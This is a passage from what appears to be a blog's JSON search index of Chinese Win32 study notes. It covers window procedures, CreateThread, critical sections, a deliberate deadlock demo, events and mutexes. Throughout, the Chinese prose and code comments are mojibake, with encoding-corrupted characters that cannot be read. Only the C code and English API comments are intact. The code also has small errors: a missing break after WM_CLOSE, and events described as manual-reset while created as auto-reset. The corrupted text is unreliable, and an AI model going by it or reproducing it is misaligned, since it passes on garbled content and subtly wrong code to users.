//çª—å£é«˜ NULL, //çˆ¶çª—å£ NULL, //èœå•çª—å£ hInstance, //å½“å‰çª—å£å¥æŸ„ NULL); if( NULL == hWnd ) &#123; return FALSE; &#125; //æ˜¾ç¤ºçª—å£ ShowWindow(hWnd, nCmdShow); //æ›´æ–°çª—å£ UpdateWindow(hWnd); return TRUE;&#125; è°ƒç”¨è¯¥å‡½æ•°ï¼Œéœ€è¦ç»™è¯¥å‡½æ•°ä¼ é€’ç¤ºä¾‹å¥æŸ„å’Œçª—å£çš„æ˜¾ç¤ºæ–¹å¼ä¸¤ä¸ªå‚æ•°ã€‚åˆ†åˆ«ä¸ºWinMain()å‡½æ•°çš„ç¬¬1ä¸ªå‚æ•°å’Œç¬¬3ä¸ªå‚æ•°ã€‚ åˆ›å»ºä¸»çª—å£æ—¶è°ƒç”¨äº†CreateWindowEx()å‡½æ•°ï¼Œé€šè¿‡MSDNæŸ¥å¾—å‡½æ•°åŸå‹ 1234567891011HWND CreateWindowEx( DWORD dwExStyle, // extended window style LPCTSTR lpClassName, // registered class name LPCTSTR lpWindowName, // window name DWORD dwStyle, // window style int x, // horizontal position of window int y, // vertical position of window int nWidth, // window width int nHeight, // window height HWND hWndParent, // handle to parent or owner window HMENU hMenu, // menu handle or child identifier HINSTANCE hInstance, // handle to application instance LPVOID lpParam // window-creation data); ç¬¬2ä¸ªå‚æ•°æ˜¯lpClassName,æ ¹æ®æ³¨é‡Šï¼Œè¯¥å‚æ•°ä¸ºå·²æ³¨å†Œç±»åã€‚è¿™ä¸ªå·²ç»æ³¨å†Œçš„ç±»åå°±æ˜¯WNDCLASSEXç»“æ„ä½“çš„lpszClassNameå­—æ®µ å¤„ç†æ¶ˆæ¯çš„çª—å£è¿‡ç¨‹WindowProcå‡½æ•°ä»‹ç»çª—å£è¿‡ç¨‹çš„å®šä¹‰æ˜¯æŒ‰ç…§MSDNä¸Šç»™å‡ºçš„å½¢å¼è¿›è¡Œå®šä¹‰çš„ï¼ŒMSDNä¸­çš„å®šä¹‰å¦‚ä¸‹ 1234LRESULT CALLBACK WindowProc( HWND hwnd, // handle to window UINT uMsg, // message identifier WPARAM wParam, // first message parameter LPARAM lParam // second message parameter); WindowProcæ˜¯çª—å£è¿‡ç¨‹çš„å‡½æ•°åï¼Œè¿™ä¸ªå‡½æ•°åå¯ä»¥éšæ„æ”¹å˜ï¼Œä½†æ˜¯çª—å£è¿‡ç¨‹çš„å‡½æ•°åå¿…é¡»ä¸WNDCLASSEXç»“æ„ä½“ä¸­lpfnWndProcçš„æˆå‘˜å˜é‡çš„å€¼ä¸€è‡´ã€‚ä¸‹é¢ä»‹ç»å‚æ•° å‚æ•°1ï¼šçª—å£å¥æŸ„ å‚æ•°2ï¼šæ¶ˆæ¯å€¼uMsg å‚æ•°3ä¸å‚æ•°4ï¼šè¿™ä¸¤ä¸ªå‚æ•°æ˜¯å¯¹äºæ¶ˆæ¯å€¼çš„é™„åŠ å‚æ•°ï¼Œå…·ä½“ç”¨æ³•éœ€è¦å‚ç…§MSDN æ­¤å‡½æ•°ä¹Ÿè¢«ç§°ä¸ºå›è°ƒå‡½æ•°ï¼Œä¸‹é¢ä¸ºæ¶ˆæ¯å›è°ƒå‡½æ•°ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041LRESULT CALLBACK WindowProc( HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)&#123; PAINTSTRUCT ps; HDC hDC; RECT rt; char *pszDrawText = &quot;Hello Windows Program&quot;; switch(uMsg) &#123; case WM_PAINT: &#123; hDC = BeginPaint(hwnd, &amp;ps); GetClientRect(hwnd, &amp;rt); DrawTextA(hDC, pszDrawText, strlen(pszDrawText),&amp;rt, DT_CENTER | DT_VCENTER | DT_SINGLELINE); EndPaint(hwnd, &amp;ps); break; &#125; case WM_CLOSE: &#123; if(IDYES == MessageBox(hwnd, &quot;æ˜¯å¦é€€å‡ºç¨‹åº&quot;, &quot;MyFirstWin&quot;, MB_YESNO)) &#123; DestroyWindow(hwnd); PostQuitMessage(0); &#125; break; &#125; default: &#123; return DefWindowProc(hwnd, uMsg, wParam, lParam); &#125; &#125; return 0;&#125; DefWindowProcä»‹ç»Windowsçš„æ¶ˆæ¯ç§ç±»æœ‰ä¸Šåƒç§ï¼Œä½†æˆ‘ä»¬åªéœ€è¦å¤„ç†ç¨‹åºéœ€è¦çš„å‡ ç§æ¶ˆæ¯ï¼Œå…¶ä½™çš„éƒ½äº¤ç»™ç³»ç»Ÿå¤„ç†ï¼ŒDefWindowProcå‡½æ•°å°±æ˜¯è¿›è¡Œä¸éœ€è¦æ¶ˆæ¯çš„å¤„ç† MSDNå¯¹DefWindowProcå‡½æ•°çš„å®šä¹‰å¦‚ä¸‹ 1234LRESULT DefWindowProc( HWND hWnd, // handle to window UINT Msg, // message identifier WPARAM wParam, // first message parameter LPARAM lParam // second message parameter); è¿™å››ä¸ªå‚æ•°è·Ÿçª—å£è¿‡ç¨‹å‚æ•°ç›¸åŒã€‚"},{"title":"ğŸ¦Win32å­¦ä¹ è®°å½•-2(åˆ›å»ºçº¿ç¨‹)","date":"2021-08-08T08:46:15.114Z","updated":"2021-08-08T08:46:15.114Z","comments":true,"path":"ä¸æƒ³éƒ¨ç½²çš„/windows/Win32-2.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/windows/Win32-2.html","excerpt":"","text":"âœˆâœˆå›¾å½¢åŒ–ç•Œé¢åˆ›å»ºè¿‡ç¨‹ç•¥è¿‡âœˆâœˆ CreateThreadå‡½æ•°ä»‹ç» MSDNå¯¹CreateThreadçš„è§£é‡Š 12345678HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); ä¸­æ–‡ç‰ˆ 123456789101112131415HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, // å®‰å…¨å±æ€§ é€šå¸¸ä¸ºNULL SIZE_T dwStackSize, // å‚æ•°ç”¨äºè®¾å®šçº¿ç¨‹å¯ä»¥å°†å¤šå°‘åœ°å€ç©ºé—´ç”¨äºå®ƒè‡ªå·±çš„å †æ ˆ // æ¯ä¸ªçº¿ç¨‹æ‹¥æœ‰å®ƒè‡ªå·±çš„å †æ ˆ LPTHREAD_START_ROUTINE lpStartAddress, // å‚æ•°ç”¨äºæŒ‡æ˜æƒ³è¦æ–°çº¿ç¨‹æ‰§è¡Œçš„çº¿ç¨‹å‡½æ•°çš„åœ°å€ LPVOID lpParameter, // çº¿ç¨‹å‡½æ•°çš„å‚æ•° // åœ¨çº¿ç¨‹å¯åŠ¨æ‰§è¡Œæ—¶å°†è¯¥å‚æ•°ä¼ é€’ç»™çº¿ç¨‹å‡½æ•°// æ—¢å¯ä»¥æ˜¯æ•°å­—ï¼Œä¹Ÿå¯ä»¥æ˜¯æŒ‡å‘åŒ…å«å…¶ä»–ä¿¡æ¯çš„ä¸€ä¸ªæ•°æ®ç»“æ„çš„æŒ‡é’ˆ DWORD dwCreationFlags, // 0 åˆ›å»ºå®Œæ¯•ç«‹å³è°ƒåº¦ CREATE_SUSPENDEDåˆ›å»ºåæŒ‚èµ· LPDWORD lpThreadId // çº¿ç¨‹ID ); // è¿”å›å€¼ï¼šçº¿ç¨‹å¥æŸ„ ç•Œé¢èµ„æºä»‹ç» WinMainå‡½æ•°12345678910int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)&#123; DialogBox(hInstance, MAKEINTRESOURCE(IDD_DIALOG_MAIN), NULL, DiaLogProc); return 0;&#125; DiaLogProcå‡½æ•°ï¼ˆæ¶ˆæ¯å›è°ƒå‡½æ•°ï¼‰123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354BOOL CALLBACK DiaLogProc( HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)&#123; switch (uMsg) &#123; case WM_INITDIALOG: &#123; ********************************è·å¾—ä¸¤ä¸ªçª—å£å¥æŸ„*************************** hEDIT_ONE = GetDlgItem(hwndDlg, IDC_EDIT_ONE); hEDIT_TWO = GetDlgItem(hwndDlg, IDC_EDIT_TWO); ************************************************************************ ********************************åˆå§‹åŒ–çª—å£******************************** SetWindowText(hEDIT_ONE, &quot;1000&quot;); SetWindowText(hEDIT_TWO, &quot;0&quot;); ************************************************************************ break; &#125; case WM_COMMAND: &#123; switch (LOWORD(wParam)) &#123; case IDC_BUTTON: &#123; *****************************åˆ›å»ºäº†ä¸¤ä¸ªçº¿ç¨‹***************************** HANDLE hThread1 = ::CreateThread(NULL, 0, ThreadProc1, NULL, 0, NULL); HANDLE hThread2 = ::CreateThread(NULL, 0, ThreadProc2, NULL, 0, NULL); ********************************************************************** ::CloseHandle(hThread1); ::CloseHandle(hThread2); return TRUE; &#125; &#125; break; &#125; case WM_CLOSE: &#123; DestroyWindow(hwndDlg); &#125; default: &#123; return DefWindowProc(hwndDlg, uMsg, wParam, lParam); &#125; break; &#125;&#125; çº¿ç¨‹å‡½æ•°1æ³¨æ„è¿™é‡Œç›´æ¥å°†è¿”å›å€¼(çº¿ç¨‹å¥æŸ„)è®¾ç½®ä¸º0ï¼Œå¦å¤–ä¸€ä¸ªçº¿ç¨‹å‡½æ•°ä¸è¿™ä¸ªç›¸ä¼¼ï¼Œä¸åœ¨è´´å‡ºæ¥ã€‚ 12345678910111213141516171819202122DWORD WINAPI ThreadProc1( LPVOID lpParameter)&#123; //å°†æ–‡æœ¬æ¡†ä¸­çš„è¾“å…¥ä¼ å…¥Bufferä¸­ TCHAR szBuffer[10]; memset(szBuffer, 0, 10); GetWindowText(hEDIT_ONE, szBuffer, 10); //å°†Bufferä¸­çš„å­—ç¬¦ä¸²è½¬ä¸ºæ•°å­— DWORD dwTimer; int check = sscanf((const char*)szBuffer, &quot;%d&quot;, &amp;dwTimer); while (dwTimer &gt; 0) &#123; Sleep(100); //åœ¨å°†æ•°å­—å‡1åå˜ä¸ºå­—ç¬¦ä¸² memset(szBuffer, 0, 10); sprintf((char*)szBuffer, &quot;%d&quot;, --dwTimer); //å°†å­—ç¬¦ä¸²æ”¾å›åˆ°æ–‡æœ¬æ¡†ä¸­ SetWindowText(hEDIT_ONE, szBuffer); &#125; return 0; &#125; æ•ˆæœ"},{"title":"ğŸ¦Win32å­¦ä¹ è®°å½•-3(çº¿ç¨‹æ§åˆ¶ä¸ä¸´ç•ŒåŒº)","date":"2021-08-08T08:46:15.112Z","updated":"2021-08-08T08:46:15.112Z","comments":true,"path":"ä¸æƒ³éƒ¨ç½²çš„/windows/Win32-3.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/windows/Win32-3.html","excerpt":"","text":"å¤šçº¿ç¨‹ä¹‹é—´çš„èµ„æºæŠ¢å é—®é¢˜â€‹ å½“å¤šä¸ªçº¿ç¨‹ä½¿ç”¨åŒä¸€ä¸ªèµ„æºæ—¶ï¼Œä¼šå‡ºç°èµ„æºæŠ¢å é—®é¢˜ ä¾‹å­ â€‹ è¿™ä¸ªç¨‹åºåŠŸèƒ½ä¸ºå‘æ–‡æœ¬æ¡†ä¸­åŠ æ•°å­—ï¼Œæ¯ä¸€æ¬¡åŠ ä¸€ï¼Œä¸¤ä¸ªçº¿ç¨‹åŒæ—¶åŠ ï¼Œæ¯ä¸€ä¸ªçº¿ç¨‹æœ€å¤šåŠ åˆ°1000ï¼Œå½“ä¸¤ä¸ªçº¿ç¨‹ç»“æŸåï¼Œæ–‡æœ¬æ¡†ä¸­çš„æœŸæœ›å€¼ä¸º2000ã€‚ä½†æ˜¯å½“åŒæ—¶æŒ‰ä¸‹ä¸¤ä¸ªæŒ‰é’®ç­‰å¾…çº¿ç¨‹ç»“æŸåï¼Œæ–‡æœ¬æ¡†ä¸­çš„ç»“æœå´ä¸æœŸæœ›å€¼æœ‰åå·® çº¿ç¨‹å‡½æ•°1 ä»£ç  123456789101112131415161718DWORD WINAPI ThreadProc1(LPVOID lpParameter)&#123; TCHAR szBuffer[10]; DWORD dwIndex = 0; DWORD dwCount; while (dwIndex &lt; 1000) &#123; GetWindowText(hEDIT, szBuffer, 10); int check = sscanf(szBuffer, &quot;%d&quot;, &amp;dwCount); dwCount++; memset(szBuffer, 0, 10); sprintf(szBuffer, &quot;%d&quot;, dwCount); SetWindowText(hEDIT, szBuffer); dwIndex++; &#125; return 0;&#125; çº¿ç¨‹å‡½æ•°2 ä»£ç  123456789101112131415161718DWORD WINAPI ThreadProc2(LPVOID lpParameter)&#123; TCHAR szBuffer[10]; DWORD dwIndex = 0; DWORD dwCount; while (dwIndex &lt; 1000) &#123; GetWindowText(hEDIT, szBuffer, 10); int check = sscanf(szBuffer, &quot;%d&quot;, &amp;dwCount); dwCount++; memset(szBuffer, 0, 10); sprintf(szBuffer, &quot;%d&quot;, dwCount); SetWindowText(hEDIT, szBuffer); dwIndex++; &#125; return 0;&#125; ä¸¤ä¸ªçº¿ç¨‹å‡½æ•°æ­¥éª¤å¦‚ä¸‹ æ–‡æœ¬æ¡†ä¸­å–å€¼ å­—ç¬¦ä¸² -&gt; æ•°å­— æ•°å­—è‡ªåŠ 1 æ•°å­— -&gt; å­—ç¬¦ä¸² æ”¾å›æ–‡æœ¬æ¡†ä¸­ é—®é¢˜ â€‹ åœ¨windowsç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨ä¸€ä¸ªCUP,ä½†æ˜¯ç”µè„‘ä¸­çš„CPUæœ‰é™ï¼Œè€Œç”µè„‘ä¸­åˆæœ‰å¾ˆå¤šè¿›ç¨‹ï¼Œæ¯ä¸€ä¸ªè¿›ç¨‹ä¸­åˆå­˜åœ¨å¾ˆå¤šçº¿ç¨‹ï¼Œæ‰€ä»¥å¼€å‘äººå‘˜åœ¨è®¾è®¡çš„æ—¶å€™è§„å®šæ¯ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨CPUçš„æ—¶é—´ä¸º20msï¼Œå½“ä¸€ä¸ªçº¿ç¨‹20msçš„æ—¶é—´ç”¨å°½ï¼Œåªæœ‰ç­‰å¾…ä¸‹æ¬¡ä¸ºä»–åˆ†é…æ—¶é—´æ—¶æ‰å¯ä»¥ç»§ç»­å·¥ä½œã€‚æ‰€ä»¥å½“ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶æ“ä½œä¸€ä¸ªå…¨å±€å˜é‡æ—¶å°±ä¼šå‡ºç°é—®é¢˜ã€‚ è§£å†³æ–¹æ¡ˆâ€‹ Windowsè®¾è®¡å‡ºäº†ä¸´ç•ŒåŒºæ¥è§£å†³çº¿ç¨‹æŠ¢å èµ„æºçš„é—®é¢˜ â€‹ å½“å¤šä¸ªè®¾è®¡ç¨‹åºå¤šä¸ªçº¿ç¨‹éƒ½æ¶‰åŠåˆ°æŸä¸ªå…¨å±€å˜é‡æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä¸´ç•ŒåŒºæ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¸´ç•ŒåŒºå¯ä»¥ç†è§£ä¸ºç»™è¿™ä¸ªå…¨å±€å˜é‡å‡å®šäº†ä¸€ä¸ªä»¤ç‰Œï¼Œè¿™ä¸ªä»¤ç‰Œåœ¨ç¨‹åºä¸­åªæœ‰ä¸ªå—ï¼Œåªæœ‰æ‹¿åˆ°ä»¤ç‰Œçš„äººæ‰å¯ä»¥å¯¹å…¨å±€å˜é‡è¿›è¡Œæ“ä½œã€‚ â€‹ å°†ä¸Šé¢çš„çº¿ç¨‹å‡½æ•°åšå¦‚ä¸‹ä¸‹ä¿®æ”¹ï¼Œå°±å¯ä»¥è§£å†³å¤šçº¿ç¨‹ä½¿ç”¨åŒä¸€ä¸ªå…¨å±€å˜é‡çš„é—®é¢˜ã€‚ ä¸´ç•ŒåŒºç»“æ„ä½“éƒ¨åˆ†æˆå‘˜è§£é‡Šç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ 1234567891011121314typedef struct _RTL_CRITICAL_SECTION &#123; PRTL_CRITICAL_SECTION_DEBUG DebugInfo; // // The following three fields control entering and exiting the critical // section for the resource // LONG LockCount; LONG RecursionCount; HANDLE OwningThread; // from the thread&#x27;s ClientId-&gt;UniqueThread HANDLE LockSemaphore; ULONG_PTR SpinCount; // force size on 64-bit systems when packed&#125; RTL_CRITICAL_SECTION, *PRTL_CRITICAL_SECTION; æ­»é”â€‹ ä¸´ç•ŒåŒºä½¿ç”¨ä¸å½“å¯èƒ½ä¼šé€ æˆæ­»é”ï¼Œå½“å®šä¹‰ä¸¤ä¸ªé”åŠä»¥ä¸Šä½¿ç”¨éœ€è¦æ ¼å¤–å°å¿ƒï¼Œå¦åˆ™ç¨‹åºå°±å¯èƒ½é€ æˆæ­»é”ã€‚ä¸‹å›¾å°±æ˜¯æ­»é”çš„åŸºæœ¬åŸç†ï¼Œå½“ä½¿ç”¨ä¸´ç•ŒåŒºæ—¶ï¼Œåº”è¯¥å°½é‡æ³¨æ„å°†ä½¿ç”¨é”çš„ä½¿ç”¨é¡ºåºï¼Œç»é‡å°†é”çš„ä½¿ç”¨é¡ºåºå˜æˆä¸€æ ·çš„ã€‚ è¯•å†™æ­»é”ç¨‹åºâ€‹ æ­»é”ç¨‹åºæ²¡æœ‰ä»»ä½•ä½œç”¨ï¼Œä½†æ˜¯å¯ä»¥åŠ æ·±å¯¹ä¸´ç•ŒåŒºçš„ç†è§£ï¼Œä¸”æ‰€è°“çš„æ­»é”ç¨‹åºåªæ˜¯é€»è¾‘ä¸Šçš„ï¼Œå½“å†™å‡ºæ¥åä¹Ÿä¸ä¸€å®šä¼šç«‹åˆ»ç”Ÿæ•ˆã€‚ çº¿ç¨‹1ä»£ç  1234567891011121314151617181920212223242526DWORD WINAPI ThreadProc1(LPVOID lpParameter)&#123; TCHAR szBuffer[10]; DWORD dwIndex = 0; DWORD dwCount; while (dwIndex &lt; 1000) &#123; EnterCriticalSection(&amp;cs1);//é”1 ***********å®¹æ˜“äº§ç”Ÿæ­»é”çš„ä½ç½®*********** EnterCriticalSection(&amp;cs2);//é”2 GetWindowText(hEDIT, szBuffer, 10); int check = sscanf(szBuffer, &quot;%d&quot;, &amp;dwCount); dwCount++; memset(szBuffer, 0, 10); sprintf(szBuffer, &quot;%d&quot;, dwCount); SetWindowText(hEDIT, szBuffer); dwIndex++; LeaveCriticalSection(&amp;cs2); LeaveCriticalSection(&amp;cs1); &#125; return 0;&#125; çº¿ç¨‹2ä»£ç  1234567891011121314151617181920212223242526DWORD WINAPI ThreadProc2(LPVOID lpParameter)&#123; TCHAR szBuffer[10]; DWORD dwIndex = 0; DWORD dwCount; while (dwIndex &lt; 1000) &#123; EnterCriticalSection(&amp;cs2);//é”2 ***********å®¹æ˜“äº§ç”Ÿæ­»é”çš„ä½ç½®*********** EnterCriticalSection(&amp;cs1);//é”1 GetWindowText(hEDIT, szBuffer, 10); int check = sscanf(szBuffer, &quot;%d&quot;, &amp;dwCount); dwCount++; memset(szBuffer, 0, 10); sprintf(szBuffer, &quot;%d&quot;, dwCount); SetWindowText(hEDIT, szBuffer); dwIndex++; LeaveCriticalSection(&amp;cs1); LeaveCriticalSection(&amp;cs2); &#125; return 0;&#125;"},{"title":"ğŸ¦Win32å­¦ä¹ è®°å½•4(äº‹ä»¶ äº’æ–¥ä½“ ä¿¡å·é‡)","date":"2021-08-08T09:16:44.580Z","updated":"2021-08-08T09:16:44.580Z","comments":true,"path":"ä¸æƒ³éƒ¨ç½²çš„/windows/Win32-4.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/windows/Win32-4.html","excerpt":"","text":"å¯¹è±¡çŠ¶æ€ é€šçŸ¥çŠ¶æ€ â€‹ è¡¨ç¤ºæ“ä½œç³»ç»Ÿå¯ä»¥è°ƒç”¨ æœªé€šçŸ¥çŠ¶æ€ æ“ä½œç³»ç»Ÿä¸å¯ä»¥è°ƒç”¨ WaitForSingleObjectå‡½æ•° 1234DWORD WaitForSingleObject( HANDLE hHandle, DWORD dwMilliseconds); hHandle å¯¹è±¡çš„å¥æŸ„ã€‚ dwMilliseconds è¶…æ—¶é—´éš”ï¼ˆä»¥æ¯«ç§’ä¸ºå•ä½ï¼‰ã€‚å¦‚æœæŒ‡å®šäº†éé›¶å€¼ï¼Œåˆ™å‡½æ•°å°†ç­‰å¾…ï¼Œç›´åˆ°å‘å‡ºä¿¡å·é€šçŸ¥å¯¹è±¡æˆ–é—´éš”è¿‡å»ä¸ºæ­¢ã€‚å¦‚æœdwMillisecondsä¸ºé›¶ï¼Œåˆ™å¦‚æœæœªç”¨ä¿¡å·é€šçŸ¥å¯¹è±¡ï¼Œåˆ™å‡½æ•°ä¸ä¼šè¿›å…¥ç­‰å¾…çŠ¶æ€ï¼›å¦åˆ™ï¼Œå‡½æ•°å°†è¿›å…¥ç­‰å¾…çŠ¶æ€ã€‚å®ƒæ€»æ˜¯ç«‹å³è¿”å›ã€‚å¦‚æœdwMillisecondsä¸ºINFINITEï¼Œåˆ™è¯¥å‡½æ•°ä»…åœ¨ä¿¡å·é€šçŸ¥å¯¹è±¡æ—¶è¿”å›ã€‚ WaitForMultipleObjectså‡½æ•°123456DWORD WaitForMultipleObjects( DWORD nCount, const HANDLE lpHandles, BOOL bWaitAll, DWORD dwMilliseconds); nCount lpHandlesæŒ‡å‘çš„æ•°ç»„ä¸­å¯¹è±¡å¥æŸ„çš„æ•°é‡ã€‚å¯¹è±¡å¥æŸ„çš„æœ€å¤§æ•°é‡ä¸ºMAXIMUM_WAIT_OBJECTSã€‚æ­¤å‚æ•°ä¸èƒ½ä¸ºé›¶ã€‚ lpHandles å¯¹è±¡å¥æŸ„æ•°ç»„ã€‚ bWaitAll å¦‚æœæ­¤å‚æ•°ä¸ºTRUEï¼Œåˆ™å½“ä¿¡å·lpHandlesæ•°ç»„ä¸­æ‰€æœ‰å¯¹è±¡çš„çŠ¶æ€æ—¶ï¼Œè¯¥å‡½æ•°å°†è¿”å›ã€‚å¦‚æœä¸ºFALSEï¼Œåˆ™å½“ä»»ä½•ä¸€ä¸ªå¯¹è±¡çš„çŠ¶æ€è®¾ç½®ä¸ºå·²ä¿¡å·é€šçŸ¥æ—¶ï¼Œè¯¥å‡½æ•°å°†è¿”å›ã€‚åœ¨åä¸€ç§æƒ…å†µä¸‹ï¼Œè¿”å›å€¼æŒ‡ç¤ºå…¶çŠ¶æ€å¯¼è‡´å‡½æ•°è¿”å›çš„å¯¹è±¡ã€‚ dwMilliseconds è¶…æ—¶é—´éš”ï¼ˆä»¥æ¯«ç§’ä¸ºå•ä½ï¼‰ã€‚å¦‚æœæŒ‡å®šäº†éé›¶å€¼ï¼Œåˆ™å‡½æ•°å°†ç­‰å¾…ï¼Œç›´åˆ°å‘å‡ºæŒ‡å®šå¯¹è±¡çš„ä¿¡å·æˆ–é—´éš”è¿‡å»ä¸ºæ­¢ã€‚å¦‚æœdwMillisecondsä¸ºé›¶ï¼Œåˆ™å¦‚æœæœªå‘å‡ºæŒ‡å®šå¯¹è±¡çš„ä¿¡å·ï¼Œåˆ™å‡½æ•°ä¸ä¼šè¿›å…¥ç­‰å¾…çŠ¶æ€ï¼›å¦åˆ™ï¼Œå‡½æ•°å°†è¿›å…¥ç­‰å¾…çŠ¶æ€ã€‚å®ƒæ€»æ˜¯ç«‹å³è¿”å›ã€‚å¦‚æœdwMillisecondsä¸ºINFINITEï¼Œåˆ™è¯¥å‡½æ•°ä»…åœ¨å‘å‡ºæŒ‡å®šå¯¹è±¡çš„ä¿¡å·æ—¶è¿”å›ã€‚ äº‹ä»¶äº‹ä»¶å¯¹è±¡çš„åˆ›å»º å‡½æ•° 123456HANDLE CreateEventA( LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName); å‚æ•° lpEventAttributes å†…æ ¸å¯¹è±¡éƒ½æ‹¥æœ‰è¯¥å‚æ•°ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è®¾ç½®NULL bManualReset å¸ƒå°”ç±»å‹ TRUE åˆ›å»ºä¸€ä¸ªæ‰‹åŠ¨é‡ç½®çš„æ—¶é—´å¯¹è±¡ï¼Œé‡ç½®éœ€è¦ç”¨åˆ°ResetEventå‡½æ•°å°†äº‹ä»¶çŠ¶æ€è®¾ç½®ä¸ºéä¿¡å·çŠ¶æ€(æœªé€šçŸ¥çŠ¶æ€) FALSE åˆ›å»ºä¸€ä¸ªè‡ªåŠ¨é‡ç½®äº‹ä»¶å¯¹è±¡,åœ¨é‡Šæ”¾å•ä¸ªç­‰å¾…çº¿ç¨‹åï¼Œç³»ç»Ÿè‡ªåŠ¨å°†äº‹ä»¶çŠ¶æ€é‡ç½®ä¸ºæœªé€šçŸ¥çŠ¶æ€ {ç®€å•æ¥è¯´} bInitialState å¦‚æœæ­¤å‚æ•°ä¸ºTRUEï¼Œåˆ™è¡¨ç¤ºäº‹ä»¶å¯¹è±¡çš„åˆå§‹çŠ¶æ€ï¼› FALSEï¼Œå°†æ˜¾ç¤ºäº‹ä»¶å¯¹è±¡çš„åˆå§‹çŠ¶æ€ã€‚å¦åˆ™ï¼Œå®ƒæ˜¯æ— ä¿¡å·çš„ã€‚ lpName äº‹ä»¶åç§° äº‹ä»¶å¯¹è±¡çš„æ§åˆ¶SetEvnet() å‡½æ•°å®šä¹‰ 123BOOL SetEvent( HANDLE hEvent); å°†äº‹ä»¶è®¾ç½®ä¸ºå·²é€šçŸ¥çŠ¶æ€ ResetEvent å‡½æ•°å®šä¹‰ 123BOOL ResetEvent( HANDLE hEvent); å°†äº‹ä»¶è®¾ç½®ä¸ºæœªé€šçŸ¥çŠ¶æ€ äº‹ä»¶åŒæ­¥â€“æ¶ˆè´¹è€…ä¸ç”Ÿäº§è€…â€‹ äº‹ä»¶çš„åŒæ­¥è§£é‡Šä¸ºå°†çº¿ç¨‹æŒ‰ç…§è§„å®šçš„é¡ºåºè¿›è¡Œï¼Œçº¿ç¨‹è¢«åˆ›å»ºå‡ºæ¥æ˜¯è¢«éšæœºåˆ†é…çš„CPUçš„ï¼Œé‚£ä¸ªCPUç©ºé—²å°±åˆ†é…ç»™å“ªä¸ªçº¿ç¨‹(è¯´å¾—ä¸æ˜¯å¾ˆä¸“ä¸šï¼Œå…·ä½“å‚ç…§å¾®è½¯å®˜æ–¹å®šä¹‰)ï¼Œæ‰€ä»¥äº‹ä»¶çš„åŒæ­¥å¯ä»¥ç†è§£ä¸ºäººä¸ºçš„æ§åˆ¶çº¿ç¨‹è¿è¡Œçš„é¡ºåº â€‹ ä¸‹é¢ä¸ºç”¨äº‹ä»¶è¿›è¡Œçº¿ç¨‹åŒæ­¥çš„æ€è·¯ åˆ›å»ºä¸¤ä¸ªäº‹ä»¶ï¼Œäº‹ä»¶Aå’Œäº‹ä»¶Bï¼Œä¸€ä¸ªäº‹ä»¶åˆå§‹åŒ–ä¸ºé€šçŸ¥çŠ¶æ€ï¼Œå¦ä¸€ä¸ªåˆå§‹åŒ–ä¸ºå·²é€šçŸ¥çŠ¶æ€ï¼Œä¸”ä¸¤ä¸ªäº‹ä»¶éƒ½è®¾ç½®ä¸ºæ‰‹åŠ¨æ›´æ”¹çŠ¶æ€ 12a_Event = CreateEvent(NULL, FALSE, TRUE, NULL);b_Event = CreateEvent(NULL, FALSE, FALSE, NULL); åˆ›å»ºçº¿ç¨‹1 1234567891011 DWORD WINAPI ThreadProc1(LPVOID lpParameter) &#123;for (int i = 0; i &lt; 10; i++) &#123; WaitForSingleObject(a_Event,INFINITE); printf(&quot;This is a Producer Create A+++++\\n&quot;); Sleep(500); SetEvent(b_Event); &#125; return 0; &#125; åœ¨çº¿ç¨‹1ä¸­å°†äº‹ä»¶Bè®¾ç½®ä¸ºå·²é€šçŸ¥çŠ¶æ€ åˆ›å»ºçº¿ç¨‹2 1234567891011DWORD WINAPI ThreadProc2(LPVOID lpParameter)&#123; for (int i = 0; i &lt; 10; i++) &#123; WaitForSingleObject(b_Event,INFINITE); printf(&quot;This is a Consumer Destroy A-----\\n&quot;); Sleep(500); SetEvent(a_Event); &#125; return 0;&#125; åœ¨ç»“æŸæ—¶å°†çº¿ç¨‹1è®¾ç½®ä¸ºå·²é€šçŸ¥çŠ¶æ€ è¿™æ ·å°±å¯ä»¥ä½¿ä¸¤ä¸ªçº¿ç¨‹äº¤æ›¿è¿›è¡Œï¼Œä¸”å……åˆ†åˆ©ç”¨äº†CPU äº’æ–¥ä½“åˆ›å»ºäº’æ–¥ä½“12345HANDLE CreateMutexA( LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName); dwDesiredAccess äº’æ–¥ä½“å±äºå†…æ ¸å¯¹è±¡ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è®¾ç½®ä¸ºNULL bInheritHandle å¦‚æœæ­¤å€¼ä¸ºTRUEï¼Œå¹¶ä¸”è°ƒç”¨æ–¹åˆ›å»ºäº†äº’æ–¥é‡ï¼Œåˆ™è°ƒç”¨çº¿ç¨‹å°†è·å¾—è¯¥äº’æ–¥å¯¹è±¡çš„åˆå§‹æ‰€æœ‰æƒã€‚å¦åˆ™ï¼Œè°ƒç”¨çº¿ç¨‹å°†æ— æ³•è·å¾—è¯¥äº’æ–¥é”çš„æ‰€æœ‰æƒã€‚ lpName 